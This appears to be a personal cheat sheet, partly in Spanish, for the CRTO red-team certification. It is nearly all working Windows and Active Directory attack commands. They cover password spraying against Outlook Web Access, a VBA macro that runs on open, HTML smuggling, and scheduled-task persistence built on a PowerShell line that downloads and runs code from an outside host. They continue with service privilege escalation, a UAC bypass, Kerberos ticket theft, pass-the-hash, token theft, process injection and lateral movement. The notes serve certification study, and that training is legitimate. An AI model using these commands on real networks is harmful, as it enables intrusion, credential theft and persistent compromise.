# CRTO
Mi own notes to pass the CRTO

# Initial Compromise

## Mail Sniper

Import the Module

```
ipmo C:\Tools\MailSniper\MailSniper.ps1
```

Check the valid usernames

```
Invoke-UsernameHarvestOWA -ExchHostname mail.domain.local -Domain domain.local -UserList possible_users.txt -OutFile valid.txt
```

Password Spraying

```
Invoke-PasswordSprayOWA -ExchHostname mail.domain.local -UserList valid.txt -Password Password
```

Dump all email accounts

```
Get-GlobalAddressList -ExchHostname mail.domain.local -UserName domain.local\user -Password Password -OutFile users.txt
```

## Visual Basic for Application (Macros)

```
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "COMMAND"

End Sub
```

## HTML Smuggling

```
<html>
    <head>
        <title>HTML Smuggling</title>
    </head>
    <body>
        <p>This is all the user will see...</p>

        <script>
        function convertFromBase64(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array( len );
            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
            return bytes.buffer;
        }

        var file ='VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
        var data = convertFromBase64(file);
        var blob = new Blob([data], {type: 'octet/stream'});
        var fileName = 'test.txt';

        if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
        else {
            var a = document.createElement('a');
            document.body.appendChild(a);
            a.style = 'display: none';
            var url = window.URL.createObjectURL(blob);
            a.href = url;
            a.download = fileName;
            a.click();
            window.URL.revokeObjectURL(url);
        }
        </script>
    </body>
</html>
```

# Host Persistence con SharPersist

## Task Scheduler

Encodear el payload

```
$str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
```
```
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
```
Configuration of the Host Persistence
```
execute-assembly SharPersist.exe -t [schtask | reg | startupfolder] -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc PAYLOAD_ENCODEADO" -n "TASK_NAME" -m add -o [hourly | daily | logon] [-f "filename"] [-k "REGISTRY_KEY_TO_MODIFIE" -v "REGISTRY_KEY_TO_CREATE"]
```

# Host Privilege Escalation

## Windows Services

Mirar los servicios
```
run sc query
```
Mirar las propiedades del servicio
```
run Get-Service | fl
```

## Unquoted Service Paths

Mirar los paths de los servicios
```
run wmic service get name, pathname
```
Mirar los permisos de objetos (carpetas, archivos...)
```
powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl
```
Enumerar con SharpUp.exe
```
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath
```
Parar un servicio
```
run sc stop VulnService1
```
Activar un servicio
```
run sc start VulnService1
```

## Weak Service Permissions

Mirar el nombre de los serivicios modificables
```
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
```
Mirar los permisos con Get-ServiceAcl.ps1 [https://github.com/Sambal0x/tools/blob/master/Get-ServiceAcl.ps1]
```
powershell Get-ServiceAcl -Name VulnService2 | select -expand Access
```
Modificar el path del servicio
```
run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe
```

## Weak Service Binary Permissions

Ver los permisos del binario
```
powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl
```
Copiar el binario
```
copy "tcp-local_x64.svc.exe" "Service 3.exe"
```
## UAC Bypasses
```
elevate uac-schtasks tcp-local
```
# Credential Theft

## Kerberos Tickets
Extraer Tickets de Kerberos
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
```
Coger el TGT
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x... /service:krbtgt /nowrap
```

# Domain Reconnaissance

## PowerView

Ver el dominio
```
powershell Get-Domain
```
Ver el dominio, el DC y su OS
```
powershell Get-Domain
```
Ver todos los dominios del bosque
```
powershell Get-ForestDomain
```
Ver la política de contraseñas del dominio
```
powershell Get-DomainPolicyData
```
Ver los grupos a los que pertenece un usuario (Get-DomainUser para ver todos los usuarios)
```
powershell Get-DomainUser -Identity jking -Properties DisplayName, MemberOf | fl
```
Ver todos los ordenadores del dominio
```
powershell Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
```
Ver todas las OU del dominio
```
powershell Get-DomainOU -Properties Name | sort -Property Name
```
Ver todos los grupos del dominio que tengan la palabra "admin"
```
powershell Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName
```
Ver los miembros de un grupo concreto
```
powershell Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName
```
Mirar todas las GPOs del dominio
```
powershell Get-DomainGPO -Properties DisplayName | sort -Property DisplayName
```
Mirar las GPOs locales
```
powershell Get-DomainGPOLocalGroup | select GPODisplayName, GroupName
```
Ver las maquinas donde un grupo del dominio es miembro de un grupo local (util para ver local admins)
```
powershell Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl
```
Ver la confianza del dominio actual con el resto
```
powershell Get-DomainTrust
```
# User Impersonation (para volver al usuario actual: rev2self)

## Pass The Hash
```
pth dominio\usuario HASH
```
## Pass The Ticket

Coger el LUID e ID del proceso cmd.exe
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
```
Pasar el ticket al proceso
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x798c2c /ticket:doIFuj[...snip...]lDLklP
```
Robar el token
```
steal_token proceso
```
Matar el proceso cuando se haga rev2self
```
kill proceso
```
## Overpass The Hash
Pedir un TGT
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user: /ntlm: /opsec /nowrap
```
## Token Impersonation
Listar los procesos
```
ps
```
Robar el token (para guardar el token, usar token-store...)
```
steal_token PID
```
## Make Token
```
make_token dominio\usuario pass
```
## Process Injection
```
inject PID x64 tcp-local
```
# Lateral Movement

## Lateral Movement
Mirar antes el software de la maquina
```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe OSInfo -ComputerName=
```
Jump
```
jump [psexec,winrm...] equipo [listener]
```
Remote-exec
```
remote-exec [psexec, winrm...] comando
```
## WMI
Subir un payload a la maquina
```
cd \\PC\ADMIN$
```
```
upload C:\Payloads\smb_x64.exe
```
```
remote-exec wmi PC C:\Windows\smb_x64.exe
```
